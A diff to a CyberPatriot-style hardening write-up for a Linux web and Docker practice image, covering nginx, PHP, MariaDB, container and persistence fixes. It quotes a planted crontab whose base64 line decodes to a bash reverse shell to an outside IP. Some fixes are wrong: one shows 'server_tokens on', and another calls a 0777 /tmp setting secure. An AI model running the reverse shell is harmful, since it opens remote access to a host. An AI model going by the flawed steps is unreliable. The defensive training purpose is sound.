@@ -40,9 +40,9 @@ jlee/.bash_history:curl -s http://localhost/api/admin/export -H "Authorization: 
 **Please keep in mind that the JWT token was partially cut, and so you would have to examine jlee's .bash_history for the full JWT.**
 Using an LLM such as GPT or Gemini and prompting them to determine the expiration date, we find out that the expiration date is `January 1st, 2030`, or `2030-01-01`
 * There are also other tools to decode JWT tokens, and so you do not necessarily need to rely on an LLM.
-* [CyberChef](https://gchq.github.io/CyberChef/)
-* [jwt.io](https://jwt.io)
-* [jwt.ms](https://jwt.ms)
+    * [CyberChef](https://gchq.github.io/CyberChef/)
+    * [jwt.io](https://jwt.io)
+    * [jwt.ms](https://jwt.ms)
 ***
 ### Forensics Question #2:
 ```
@@ -418,6 +418,20 @@ pid /run/nginx.pid;
 include /etc/nginx/modules-enabled/*.conf;
 ```
 After changing `user root` to `user www-data`, we earn points by separating privileges and minimizing the attack vector.
+### Fixed directory traversal - alias with trailing slash (T1083 - File Discovery)
+In `/etc/nginx/sites-available/dashboard`, there is an insecure configuration:
+```nginx
+location /static {
+    alias /var/www/dashboard/static/;
+}
+```
+* The main issue is unsafe use of alias without a trailing slash, as it can cause path confusion / unintended file exposure. The intended fix is to place a trailing slash after `/static`
+```nginx
+location /static/ {
+    alias /var/www/dashboard/static/;
+}
+```
+**NOTE: This is a currently bugged vulnerability, however if you want to cheese the scoring, simply remove the alias line from the file!**
 ### Removed backup config from webroot (T1552.001 – Credentials in Files) – 3 pts
 After running `ls -la` in `/var/www/dashboard/`, we are able to view all files in the directory, including hidden ones:
 ```
@@ -438,22 +452,273 @@ There are two major vulnerabilities that we can see:
 * We have `.env` **containing important credentials** easily located in a **production environment!**
 For this vulnerability, after removing the `.nginx.conf.bak` file, we gain points for minimizing the attack surface.
 ### Enabled Nginx access logging (T1070.002 – Clear Linux or Mac System Logs) – 2 pts
+NGINX has a variety of configuration settings to improve hardening, with one of them being enabling access logging. Access logging allows for us to record HTTP activity happening on our server, meaning we are able to perform forensics analysis of malicious activity if we needed to after an attack.
+```nginx
+$ sudo vim /etc/nginx/nginx.conf
+
+http {
+    --> access_log on; <--
+    error_log /var/log/nginx/error.log;
+}
+``` 
+Therefore we earn points, because we are ensuring malicious behaviors are being recorded.
 ### Disabled Nginx server version disclosure (T1082 – System Information Discovery) – 3 pts
+Similar to the previous vulnerability, disabling the server version is extremely important when utilizing NGINX, or any other HTTP service. Allowing for attackers to see your specific server version allows them to research CVEs related to the specific version, allowing them unauthorized access if compromised.
+```nginx
+$ sudo vim /etc/nginx/nginx.conf
+
+http {
+    --> server_tokens on; <--
+}
+```
 ### Disabled insecure TLS versions in Nginx (T1557 – Adversary-in-the-Middle) – 3 pts
+TLS is a cryptographic protocol that encrypts communication. Older TLS versions are outdated, and are prone to cryptographic exploitations and insecure handshakes. They use weak ciphers, and allow attackers to utilize weaker encryption. To remediate this, simply remove the outdated protocols from `/etc/nginx/sites-available/dashboard`
+```nginx
+$ sudo vim /etc/nginx/sites-available/dashboard
+
+server {
+    listen 443 ssl default_server;
+    listen [::]:443 ssl default_server;
+
+    server_name botforge.local;
+    root /var/www/dashboard;
+    index index.php index.html;
+
+    ssl_certificate /etc/nginx/ssl/server.crt;
+    ssl_certificate_key /etc/nginx/ssl/server.key;
+
+    --> ssl_protocols TLSv1.2 TLSv1.3; <--
+}
+```
 ### Disabled allow_url_include (T1105 – Ingress Tool Transfer) – 4 pts
+Due to the nature of this image being LAMP-oriented, PHP is a major component of the stack that must be configured and secured.
+* One configuration setting that should be disabled is `allow_url_include`, which lets certain PHP functions process files from remote URLs. This could allow for remote code execution.
+* There are two major PHP configuration files which should be edited: `/etc/php/8.3/fpm/php.ini` and `/etc/php/8.3/cli/php.ini`
+```php
+;;;;;;;;;;;;;;;;;;
+; Fopen wrappers ;
+;;;;;;;;;;;;;;;;;;
+
+; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
+; https://php.net/allow-url-fopen
+allow_url_fopen = Off
+
+; Whether to allow include/require to open URLs (like https:// or ftp://) as files.
+; https://php.net/allow-url-include
+allow_url_include = Off
+```
 ### Revoked database privileges from terminated user vex (T1078.003) – 3 pts
+Due to vex being a terminated user, chances are that this termination was not reflected in our database. We can delete her from the users table using the following SQL instructions:
+```SQL
+SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| botforge           |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+USE mysql;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| column_stats              |
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| global_priv               |
+| gtid_slave_pos            |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| index_stats               |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| roles_mapping             |
+| servers                   |
+| slow_log                  |
+| table_stats               |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| transaction_registry      |
+| user                      |
++---------------------------+
+SELECT * FROM user;
+MariaDB [mysql]> DROP USER 'vex'@'localhost'
+```
+### Secured MariaDB root - password required or socket auth (T1078.003 - Valid Accounts) - 4 pts
+To ensure that a password is required for the root user, we just have to assign the root user a password using the following SQL instructions:
+```SQL
+ALTER USER 'root'@'localhost' IDENTIFIED BY 'Cyb3rPatriot$';
+FLUSH PRIVILEGES;
+```
+This enforces the necessary command: `mysql -u root -p`, where people must input the password.
 ### Removed remote root login for MariaDB (T1021 – Remote Services) – 4 pts
+To achieve a secure installation, and disable remote root login, run the following command: `sudo mariadb-secure-installation`
+```
+mford@botforge:~$ sudo mariadb-secure-installation
+
+Switch to unix_socket authentication [Y/n] n
+Change the root password? [Y/n] n
+Remove anonymous users? [Y/n] y
+Disallow root login remotely? [Y/n] y
+Remove test database and access to it? [Y/n] y
+Reload privilege tables now? [Y/n] y
+```
+This removes minimizes the attack surface by reducing the amount of ways people can connect to our server.
 ### MariaDB bound to localhost only (T1021 – Remote Services) – 4 pts
-### Removed privileged docker group (T1611) – Hint: Docker group = root equivalent. Check docker-compose.yml for container escapes – 4 pts
+To further bound MariaDB to only localhost, we simply have to configure the service and have it acknowledge our binding address. To do this, we configure `/etc/mysql/mariadb.conf.d/50-server.cnf`, and add the following:
+```conf
+[mysqld]
+bind-address=127.0.0.1
+```
+This further minimizes the attack surface.
+### Removed jlee from docker group (T1611) -> Hint: Docker group = root equivalent. Check docker-compose.yml for container escapes - 4 pts
+In `/etc/group`, there is a group called `docker` at the end of the file that encapsulates the users `jlee` and `mford`. Due to the fact that `jlee` is not an authorized administrator, she should not have access to the `docker` group. To remediate this, just delete her name from the entry:
+```
+docker:x:983:mford
+```
+This is an important remediation because being in the docker group allows you to interact with Docker, which itself runs under the `root` user.
 ### Removed privileged flag from containers (T1611) – Hint: Check for other dangerous Docker settings: socket mounts, capabilities – 5 pts
+In `/opt/botforge/docker-compose.yml`, there were many dangerous flags set that effectively ruin the point of Docker's isolation. To score this remediation, you have to change the `privileged: true` flag to `privileged: false`, as it gives access to the host machine's root user.
+```yml
+services:
+  php-dashboard:
+    image: php:8.2-fpm
+    privileged: true # --> privileged: false
+    volumes:
+      - /var/www/dashboard:/var/www/html
+      - /var/run/docker.sock:/var/run/docker.sock
+    networks:
+      - botnet
+    restart: unless-stopped
+```
 ### Removed Docker socket mount from containers (T1611) – 5 pts
-### Removed SFTP ADMIN capability from containers (T1611) – 4 pts
+In `/opt/botforge/docker-compose.yml`, there is a dangerous mount that mounts the host's `/var/run/docker.sock` inside the container. This effectively allows a compromised attacker to have access to the original docker socket, meaning they can issue docker API commands. Eventually, they can spin up a new container, mount the host file system, interacting with the host's filesystem with root privileges.
+* To remediate this, just delete the line `- /var/run/docker.sock:/var/run/docker.sock`
+```yml
+services:
+  php-dashboard:
+    image: php:8.2-fpm
+    privileged: false
+    volumes:
+      - /var/www/dashboard:/var/www/html
+      - /var/run/docker.sock:/var/run/docker.sock # --> delete this
+    networks:
+      - botnet
+    restart: unless-stopped
+```
+### Removed SYS_ADMIN capability from containers (T1611) – 4 pts
+In `/opt/botforge/docker-compose.yml`, the container was given `SYS_ADMIN`, meaning the container can mount and unmount filesystems, and bypass container isolation. This effectively allows them to ecape into the host machine. To remediate this, remove the capability.
+```yml
+ botrunner:
+    image: python:3.11-slim
+    cap_add: # --> delete this
+      - SYS_ADMIN # --> delete this
+    volumes:
+      - /opt/botforge/bots:/app
+    working_dir: /app
+    command: ["python", "-c", "import time; time.sleep(infinity)"]
+    networks:
+      - botnet
+    restart: unless-stopped
+```
+### Removed host PID namespace from containers (T1611) - 3 pts
+In `/opt/botforge/docker-compose.yml`, a dangerous flag set was `pid: "host"`. This effectively makes it so that the container can view all the running processes on the host machine, and can even interact with them depending on the permissions set, injecting code or causing crashes. Moreover, it allows for them to conduct reconnaissance on the host machine before they attempt to compromise the system. It is better to remove this flag entirely.
+```yml
+  botrunner:
+    image: python:3.11-slim
+    cap_add:
+      - SYS_ADMIN
+    pid: "host" # --> delete this
+    volumes:
+      - /opt/botforge/bots:/app
+    working_dir: /app
+    command: ["python", "-c", "import time; time.sleep(infinity)"]
+    networks:
+      - botnet
+    restart: unless-stopped
+```
+After remediating the potential reconnaissance, we earn 3 points!
 ### Removed untrusted registry “vexregistry.io” from Docker config (T1195.002) – 3 pts
+In `/opt/botforge/docker-compose.yml`, a configuration setting is set so that we pull an image from an unknown registry, and execute their code with our filesystem. To remove this vulnerability, simply delete vex's registry from the file:
+```yml
+  metrics:
+    image: vex-registry.io:5000/metrics-collector:latest # --> delete this
+    networks:
+      - botnet
+    restart: "no"
+```
+Additionally, **we have to remove references to insecure repositories in /etc/docker/daemon.json**:
+```json
+{
+    "insecure-registries": ["vex-registry.io:5000", "http://10.0.0.100:5000"], <-- delete this
+    "live-restore": true,
+    "userland-proxy": false
+}
+```
 ### Removed netcat backdoor from /etc/crontab (T1053.003) – Hint: Check user crontabs too with ‘crontab -l -u <user>’ – 5 pts
+In `/etc/crontab`, there is a line with a netcat backdoor. Simply delete it to remediate this vulnerability.
 ### Removed vex user crontab with reverse shell (T1053.003) – Hint: Look for hidden cron files in /etc/cron.d – 5 pts
+User crontabs are held in the directory `/var/spool/cron/crontabs/`, and in this case, the only crontab upon examining the directory is `/var/spool/cron/crontabs/vex`. After investigating the contents, we see this:
+```
+SHELL=/bin/bash
+PATH=/usr/local/bin:/usr/bin:/bin
+
+# Backup task
+0 */4 * * * echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjk5LzgwODAgMD4mMQ==" | base64 -d | bash
+```
+Due to vex being an unauthorized user on our system regardless, we can just delete this crontab and remediate the vulnerability.
 ### Removed malicious systemd service “system-update” (T1543.002) – Hint: Check for SUID binaries: find / -perm -4000 – 5 pts
+To remediate this vulnerability, having a baselining tool is your best friend. You are quickly able to compare which services are normal, and which are non-standard.
+* You might have been able to spot this yourself if you were familiar with the standard services.
+```
+$ sudo systemctl --type=service
+system-update.service                                 loaded active running System Update Service
+```
+Once this server is recognized as suspicious, you can disable it using `systemctl disable --now system-update.service`
+* It is also important to analyze the contents of the service file to know what it is running. The file path is typically `/etc/systemd/system/system-update.service`
+```conf
+[Unit]
+Description=System Update Service
+After=network.target
+Documentation=man:apt(8)
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/system-update --daemon --quiet
+Restart=always
+RestartSec=30
+Nice=19
+
+[Install]
+WantedBy=multi-user.target
+```
+We are able to see that it is running `/usr/local/bin/system-update`, so after quick examination, we are able to see that it is malware. We can delete it using `rm /usr/local/bin/system-update`.
 ### Removed SUID backdoor /usr/local/bin/healthcheck (T1548.001) – Hint: Check /etc/ld.so.preload for library injection – 5 pts
+This SUID backdoor could have been found through the respective crontab, or through checking for SUID binaries using the `find` command:
+* `find / -type f -perm /4000 -exec ls {} \; 2>/dev/null`
 ### Removed malicious ld.so.preload entry (T1547.006) – 5 pts
+The `/etc/ld.so.preload` is typically empty, and so due to the suspicious behavior of it having an entry, we must analyze it. `/etc/ld.so.preload` is in charge of loading shared object libraries when a program is executed, potentially modifying program behavior.
+```
+root@botforge:/etc# cat /etc/ld.so.preload 
+/usr/lib/libsystem.so
+```
+After analyzing `/usr/lib/libsystem.so`, you are able to see that it is in fact compiled, and upon using `strings`, you can see `libvex.c`, which may or may not be a reference to the malicious user `vex`.
+* In any case, delete `/usr/lib/libsystem.so`, and clear `/etc/ld.so.preload`.
 ### Removed malicious MOTD script (T1546.004) – Hint: Check /etc/polkit-1/rules.d/ for privilege escalation rules – 5 pts
 The directory `/etc/update-motd.d/` is notorious for being abused and having established persistance mechanisms. Upon inspection of the files in this directory, the file `/etc/update-motd.d/99-sysinfo` has malware.
 ```bash
@@ -538,7 +803,18 @@ $ sudo mv .env /root/.env
 ```
 Hence, we gain points for eliminating a really important vulnerability.
 ### Fixed tmpfiles.d config /tmp bash sticky bit (T1222 – File Permission Modification) – 3 pts
+A sticky bit, is a bit permission that disallows people from deleting files they do not themselves own. This is extremely important as `/tmp/` is a word-writable directory. The directory associated with assigning these attributes is `/etc/tmpfiles.d/`, and upon examining it, we see that there is a file `/etc/tmpfiles.d/tmp.conf` with suspicious contents:
+```
+d /tmp 0777 root root -
+d /var/tmp 0777 root root -
+```
+This configuration is secure because we are not assigning the sticky bit to the two world-writable directories `/tmp/` and `/var/tmp/`. To remediate this, we change the 0 bit to a 1 to represnt the sticky bit:
+```
+d /tmp 1777 root root -
+d /var/tmp 1777 root root -
+```
 ### Removed execution from /tmp on srv.log (T1222 – File Permissions) – 3 pts
+
 ### Cleared credentials from root bash history (T1552.003 – Bash History) – 3 pts
 Following Forensics Question 1, it was a hint to us that the .bash_history files can contain vital information. Applying this observation to other accounts such as `root`, you come to find that there are credentials that if leaked, pose an immediate security risk. Hence, by clearing out `/root/.bash_history`, you significantly minimize risk.
 ```
@@ -546,6 +822,28 @@ ln -sf /dev/null .bash_history
 ```
 * This ensures that any recorded actions of `root` are immediately nulled.
 ### Removed Docker registry credentials from config (T1552.001 – Credentials in Files) – 3 pts
+The workstation has been compromised, and so keeping authentication tokens, especially those that have not changed since the attack, is extremely bad practice. Hence, we should remove the authentication table stored in `/home/mford/.docker/config.json` due to their active ability to be abused.
+```json
+{
+    --> "auths": {
+        "https://index.docker.io/v1/": {
+            "auth": "Ym90Zm9yZ2U6UHJvZHVjdGlvbjIwMjQh"
+        },
+        "ghcr.io": {
+            "auth": "bWZvcmQ6Z2hwX2Zha2V0b2tlbjEyMzQ1Njc4OQ=="
+        }
+    }, <--
+    "credsStore": "",
+    "currentContext": "default"
+}
+```
+The previous configuration becomes the one below:
+```json
+{
+    "credsStore": "",
+    "currentContext": "default"
+}
+```
 ### Removed NOPASSWD from mford sudoers entry (T1548.003 – Sudo) – 3 pts
 After investigating `/etc/sudoers.d/`, there were many suspicious files. One such file was `mford`, which allowed user `mford` to escalate privileges without a password.
 * To remediate this vulnerability, simply delete the file: `rm /etc/sudoers.d/mford`
@@ -565,3 +863,10 @@ Enabling automatic security updates ensure the system receives important updates
 $ sudo apt install unattended-upgrades
 $ sudo dpkg-reconfigure unattended-upgrades
 ```
+
+## Score Report:
+* ![Score Report P1](assets/score-report-1.png)
+* ![Score Report P2](assets/score-report-2.png)
+
+## Credit
+Thank you to Tirefire and the entire CyberPatriot community for assisting me crack the final few vulnerabilities.
